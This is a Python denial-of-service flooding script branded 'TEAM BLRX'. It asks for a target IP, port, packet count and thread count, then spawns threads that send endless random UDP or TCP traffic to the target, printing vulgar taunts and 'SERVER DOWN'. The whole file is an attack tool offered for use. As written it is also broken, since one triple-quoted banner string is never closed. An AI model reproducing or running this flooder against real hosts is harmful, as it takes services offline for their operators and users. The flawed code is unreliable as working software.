import random
import socket
import threading
import platform

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 TEAM BLRX is Presenting to you :


                                                                                         
 ##        ####                                                                           
 ##        ####                                      ##                                   
 ##          ##                                      ##                                   
 ##.###:     ##      ###  ###   ##.####            #######    .####:    :####    ## #:##: 
 #######:    ##       ##::##    #######            #######   .######:   ######   ######## 
 ###  ###    ##       :####:    ###.                 ##      ##:  :##   #:  :##  ##.##.## 
 ##.  .##    ##        ####     ##                   ##      ########    :#####  ## ## ## 
 ##    ##    ##        :##:     ##                   ##      ########  .#######  ## ## ## 
 ##.  .##    ##        ####     ##                   ##      ##        ## .  ##  ## ## ## 
 ###  ###    ##:      :####:    ##                   ##.     ###.  :#  ##:  ###  ## ## ## 
 #######:    #####    ##::##    ##                   #####   .#######  ########  ## ## ## 
 ##.###:     .####   ###  ###   ##                   .####    .#####:    ###.##  ## ## ## 

Created by zinou

	""")
else :
	print("""
 TEAM blrx is Presenting to you :

                                                                                         
 ##        ####                                                                           
 ##        ####                                      ##                                   
 ##          ##                                      ##                                   
 ##.###:     ##      ###  ###   ##.####            #######    .####:    :####    ## #:##: 
 #######:    ##       ##::##    #######            #######   .######:   ######   ######## 
 ###  ###    ##       :####:    ###.                 ##      ##:  :##   #:  :##  ##.##.## 
 ##.  .##    ##        ####     ##                   ##      ########    :#####  ## ## ## 
 ##    ##    ##        :##:     ##                   ##      ########  .#######  ## ## ## 
 ##.  .##    ##        ####     ##                   ##      ##        ## .  ##  ## ## ## 
 ###  ###    ##:      :####:    ##                   ##.     ###.  :#  ##:  ###  ## ## ## 
 #######:    #####    ##::##    ##                   #####   .#######  ########  ## ## ## 
 ##.###:     .####   ###  ###   ##                   .####    .#####:    ###.##  ## ## ##   TEAM blrx


print("DDos")
ip= str(input("                    Server ip Blrx :"))
port= int(input("                   port blrx :"))
choice = str(input("                    DDoS Attack?? (y/n) X :"))
times= int(input("                    Paket blrx  :"))
threads= int(input("                    threads blrx :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM MRX TNIK $$$$")
		except:
			print("[!] تم نيك سيرفر!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM blrx TA9TA7EM!!!!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
